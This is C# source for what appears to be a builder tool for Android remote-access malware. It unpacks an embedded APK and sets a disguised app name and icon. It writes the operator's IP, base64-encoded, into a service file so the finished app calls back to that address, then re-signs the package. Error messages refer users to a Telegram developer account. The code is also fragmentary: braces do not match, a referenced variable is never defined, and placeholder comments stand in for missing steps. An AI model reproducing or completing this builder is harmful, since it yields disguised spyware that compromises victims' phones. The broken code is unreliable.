private void button_0_Click(object sender, EventArgs e)
{
    try
    {
        if (string.IsNullOrWhiteSpace(this.textBox_0.Text))
        {
            Class9.smethod_1("Please Set Your Icon");
            log.AppendText("Please Set Your Icon\n");
        }
        else if (!string.IsNullOrWhiteSpace(this.textBox_1.Text))
        {
            if (string.IsNullOrWhiteSpace(this.textBox_4.Text))
            {
                Class9.smethod_1("Please Set Your IP");
                log.AppendText("Please Set Your IP\n");
            }
            else if (!string.IsNullOrWhiteSpace(this.textBox_3.Text))
            {
                if (string.IsNullOrWhiteSpace(this.textBox_24.Text))
                {
                    Class9.smethod_1("Please Set Your Key");
                    log.AppendText("Please Set Your Key\n");
                }
                else if (!string.IsNullOrWhiteSpace(this.textBox_23.Text))
                {
                    if (string.IsNullOrWhiteSpace(this.textBox_2.Text))
                    {
                        Class9.smethod_1("Please Set client Name");
                        log.AppendText("Please Set client Name\n");
                    }
                    else
                    {
                        this.guna2ProgressBar_0.Visible = true;
                        this.guna2ProgressBar_0.Value = 20;
                        string text = "C:\\src";
                        if (Directory.Exists(text))
                        {
                            try
                            {
                                Directory.Delete(text, true);
                                log.Invoke(new Action(() => log.AppendText("Deleted existing directory: " + text + "\n")));
                            }
                            catch (IOException ex)
                            {
                                log.AppendText("Error deleting directory: " + ex.Message + "\n");
                            }
                        }

                        byte[] source = Resources.source;
                        byte[] key = Resources.key1;
                        byte[] apktool = Properties.Resources.apktool;
                        byte[] certificate = Resources.certificate;
                        string text2 = Path.Combine(Path.GetTempPath(), "key1.pk8");
                        string text3 = Path.Combine(Path.GetTempPath(), "certificate.pem");
                        string text4 = Path.Combine(Path.GetTempPath(), "apktool.jar");
                        string text5 = Path.Combine(Path.GetTempPath(), "source.apk");
                        string text6 = Path.Combine(Path.GetTempPath(), "apksigner.jar");
                        string text7 = Path.Combine(Path.GetTempPath(), "NewKey.keystore");
                        log.Invoke(new Action(() => log.AppendText("Building project...\n")));
                        
                        File.WriteAllBytes(text5, source);
                        File.WriteAllBytes(text2, key);
                        File.WriteAllBytes(text3, certificate);
                        File.WriteAllBytes(text4, apktool);

                        string text8 = "C:\\src";
                        this.guna2ProgressBar_0.Value = 1;
                        ProcessStartInfo processStartInfo = new ProcessStartInfo
                        {
                            FileName = string_0,
                            Arguments = string.Concat(new string[] { "-jar \"", text4, "\" d \"", text5, "\" -o ", text8 }),
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        Thread.Sleep(2000);
                        Process process = new Process
                        {
                            StartInfo = processStartInfo
                        };

                        this.guna2ProgressBar_0.Value = 2;
                        process.Start();
                        process.WaitForExit();

                        if (process.ExitCode == 0)
                        {
                            this.guna2ProgressBar_0.Value = 50;
                            string text9 = this.textBox_4.Text;
                            string text10 = this.textBox_3.Text;
                            string text11 = this.textBox_2.Text;
                            string text12 = this.textBox_24.Text;
                            string text13 = this.textBox_23.Text;
                            string text14 = this.textBox_1.Text;
                            string text15 = this.qPifinBfkt.Text;

                            string text25 = this.textBox_15.Text;
                            string text26 = this.textBox_14.Text;
                            this.guna2ProgressBar_0.Value = 3;
                            string text27 = "C:\\src";

                            if (!Directory.Exists(text27))
                            {
                                Class9.smethod_1("Error Building (Error number 2238");
                                return;
                            }

                            // التحقق من اختيار عنصر في comboBox_0
                            if (this.comboBox_0.SelectedItem != null)
                            {
                                string text28 = this.comboBox_0.SelectedItem.ToString();

                                // تخصيص استبدال الأرقام بناءً على الاختيار
                                if (text28.Contains("V1"))
                                {
                                    string text29 = "C:\\src\\apktool.yml";
                                    string text30 = File.ReadAllText(text29);

                                    text30 = text30.Replace("22", this.textBoxNewValue2.Text);
                                    text30 = text30.Replace("29", this.textBoxNewValue1.Text); // استبدال 29 بالقيمة من textBox_22
                                    text30 = text30.Replace("2.9.3", this.textBoxVersionNumber.Text);

                                    File.WriteAllText(text29, text30);
                                }
                                else if (text28.Contains("V2"))
                                {
                                    // يمكنك إضافة منطق آخر هنا إذا لزم الأمر
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    catch (Exception ex)
    {
        // الحصول على رقم السطر من StackTrace وعرضه في رسالة الخطأ
        log.AppendText($"An error occurred: {ex.Message}\nError at line: {new StackTrace(ex, true).GetFrame(0).GetFileLineNumber()}");
    }
}
try
{
    string text31 = "C:\\src\\res\\values\\strings.xml";
    string text32 = File.ReadAllText(text31);
    text32 = text32.Replace("App_Name", text14);
    File.WriteAllText(text31, text32);
}
catch (Exception ex)
{
    log.AppendText($"Error processing strings.xml: {ex.Message}\nError at line: {new StackTrace(ex, true).GetFrame(0).GetFileLineNumber()}");
}

try
{
    string text33 = "C:\\src\\AndroidManifest.xml";
    string text34 = File.ReadAllText(text33);
    text34 = text34.Replace("App_Name", text14);
    File.WriteAllText(text33, text34);
    this.guna2ProgressBar_0.Value = 4;
}
catch (Exception ex)
{
    log.AppendText($"Error processing AndroidManifest.xml: {ex.Message}\nError at line: {new StackTrace(ex, true).GetFrame(0).GetFileLineNumber()}");
}

try
{
    string text35 = "C:\\src\\res\\drawable\\sunshineh70.png";
    string text36 = "C:\\src\\res\\drawable\\skinicon.png";
    string text300 = "C:\\src\\res\\drawable\\eligibilityq70.png";
    
    if (File.Exists(text35))
    {
        File.Delete(text35);
    }
    if (File.Exists(text36))
    {
        File.Delete(text36);
    }
    
    this.guna2ProgressBar_0.Value = 5;
    File.Copy(this.textBox_0.Text, "C:\\src\\res\\drawable\\sunshineh70.png");
    File.Copy(this.guna2TextBox12.Text, "C:\\src\\res\\drawable\\eligibilityq70.png");
    File.Copy(this.textBox_0.Text, "C:\\src\\res\\drawable\\skinicon.png");
    this.guna2ProgressBar_0.Value = 6;
}
catch (Exception ex)
{
    log.AppendText($"Error processing drawable resources: {ex.Message}\nError at line: {new StackTrace(ex, true).GetFrame(0).GetFileLineNumber()}");
}

try
{
    string text37 = "C:\\src\\smali\\build\\ledear\\qdqnckphnskpoklnucahafazzeueiinkgelekbdwndgdqmgone2\\ibjktbxkyaznmkvlthlhjwqloukjaenmbylwzyurqloeplgnka3\\initializeService.smali";
    string text38 = File.ReadAllText(text37);
    byte[] bytes = Encoding.UTF8.GetBytes(text9);
    string text39 = Convert.ToBase64String(bytes);
    text38 = text38.Replace("MTkyLjE2OC4xLjE4Ng==", text39);
    File.WriteAllText(text37, text38);
    this.guna2ProgressBar_0.Value = 10;
}
catch (Exception ex)
{
    log.AppendText($"Error processing initializeService.smali: {ex.Message}\nError at line: {new StackTrace(ex, true).GetFrame(0).GetFileLineNumber()}");
}

// تابع إضافة كتل try-catch للأجزاء المتبقية بنفس النمط السابق

// مثال لكود آخر
try
{
    // جزء آخر من الكود هنا...
}
catch (Exception ex)
{
    log.AppendText($"Error processing another file: {ex.Message}\nError at line: {new StackTrace(ex, true).GetFrame(0).GetFileLineNumber()}");
}
};
try
{
    this.guna2ProgressBar_0.Value = 91;
    Process process2 = new Process
    {
        StartInfo = processStartInfo2
    };

    this.guna2ProgressBar_0.Value = 92;
    process2.Start();
    this.guna2ProgressBar_0.Value = 97;
    process2.WaitForExit();
    this.guna2ProgressBar_0.Value = 93;

    if (process2.ExitCode == 0)
    {
        if (Directory.Exists(text))
        {
            try
            {
                Directory.Delete(text, true);
            }
            catch (IOException ex)
            {
                log.AppendText($"Error deleting directory: {ex.Message}\nError at line: {new StackTrace(ex, true).GetFrame(0).GetFileLineNumber()}");
            }
        }

        string text70 = "C:\\temp\\temp.apk";
        if (!File.Exists(text70))
        {
            Class9.smethod_1("Error building Error Number 3368");
            File.Delete(text4);
            File.Delete(text5);
            File.Delete(text6);
            File.Delete(text7);
            return;
        }

        if (!this.drakeUICheckBox_10.Checked)
        {
            File.Delete(text4);
            File.Delete(text5);
            string text71 = string_1;
            string text72 = "res\\java\\bin\\apksigner\\key.pk8";
            string text73 = "res\\java\\bin\\apksigner\\certificate.pem";
            string text74 = "C:\\output";

            if (!Directory.Exists(text74))
            {
                Directory.CreateDirectory(text74);
            }

            string text75 = "C:\\output\\" + this.textBox_1.Text + ".apk";
            string text76 = string.Concat(new string[]
            {
                string_0, " -jar ", text71, " sign  --out \"", text75, "\" --key ", text72, " --cert ", text73, " ", text70
            });

            try
            {
                Process process3 = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        RedirectStandardInput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                process3.Start();
                process3.StandardInput.WriteLine(text76);
                process3.StandardInput.WriteLine("start C:\\output & del " + text70);
                process3.StandardInput.Flush();
                process3.StandardInput.Close();
                process3.WaitForExit();
                process3.Close();
            }
            catch (Exception ex)
            {
                log.AppendText($"Error during signing process: {ex.Message}\nError at line: {new StackTrace(ex, true).GetFrame(0).GetFileLineNumber()}");
            }

            Process process4 = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    RedirectStandardInput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process4.Start();
            string text77 = "C:\\output\\" + this.textBox_1.Text + ".apk";
            if (!File.Exists(text77))
            {
                MessageBox.Show("Error building Error Number 1533. Send this error to t.me/Ledear_dev");
                base.Close();
                File.Delete(text4);
                File.Delete(text5);
                return;
            }
        }
        else
        {
            // قسم آخر عندما تكون drakeUICheckBox_10.Checkd
            string text78 = string_1;
            string text79 = text2;
            string text80 = text3;
            string text81 = "C:\\output";

            if (!Directory.Exists(text81))
            {
                Directory.CreateDirectory(text81);
            }

            string text82 = text81 + "/" + text14 + ".apk";
            string text83 = string.Concat(new string[]
            {
                string_0, " -jar \"", text78, "\" sign  --out \"", text82, "\" --key \"", text79, "\" --cert \"", text80, "\" \"", text70, "\""
            });

            try
            {
                Process process5 = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        RedirectStandardInput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                process5.Start();
                process5.StandardInput.WriteLine(text83);
                process5.StandardInput.Flush();
                process5.StandardInput.Close();

                string errorOutput = process5.StandardError.ReadToEnd();
                process5.WaitForExit();
                process5.Close();

                if (!string.IsNullOrEmpty(errorOutput))
                {
                    log.AppendText("Error during build process:\n" + errorOutput + "\n");
                    MessageBox.Show("Error during build process. Check log for details.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    this.guna2ProgressBar_0.Value = 100;
                    log.AppendText("Process completed successfully!\n");
                    this.guna2ProgressBar_0.Visible = false;
                    this.button_0.Enabled = false;
                }

                string text84 = "C:\\output\\" + text14 + ".apk";
                if (!File.Exists(text84))
                {
                    MessageBox.Show("Error building Error Number 4479");
                    Class9.smethod_1("Error building Error Number 4479");
                    return;
                }

                string text85 = "C:\\output";
                if (Directory.Exists(text85))
                {
                    try
                    {
                        string[] files2 = Directory.GetFiles(text85);
                        foreach (string text86 in files2)
                        {
                            if (Path.GetExtension(text86).Equals(".idsig", StringComparison.OrdinalIgnoreCase))
                            {
                                File.Delete(text86);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        log.AppendText("Exception occurred: " + ex.Message + "\n");
                    }
                }

                this.timer_0.Stop();
                string text87 = "start C:\\output & del " + text70 + " ";
                Process process6 = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        RedirectStandardInput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                process6.Start();
                process6.StandardInput.WriteLine(text87);
                process6.StandardInput.Flush();
                process6.StandardInput.Close();
                process6.WaitForExit();
                process6.Close();
            }
        }
    }
    else
    {
        string errorOutput = process2.StandardError.ReadToEnd();
        log.AppendText("Error during build process: " + errorOutput + "\n");
        MessageBox.Show("An error occurred during the build process.\n" + errorOutput, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        this.timer_0.Stop();
    }
}
catch (Exception ex)
{
    log.AppendText($"An error occurred: {ex.Message}\nError at line: {new StackTrace(ex, true).GetFrame(0).GetFileLineNumber()}");
    MessageBox.Show("An unexpected error occurred. Check log for details.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
}
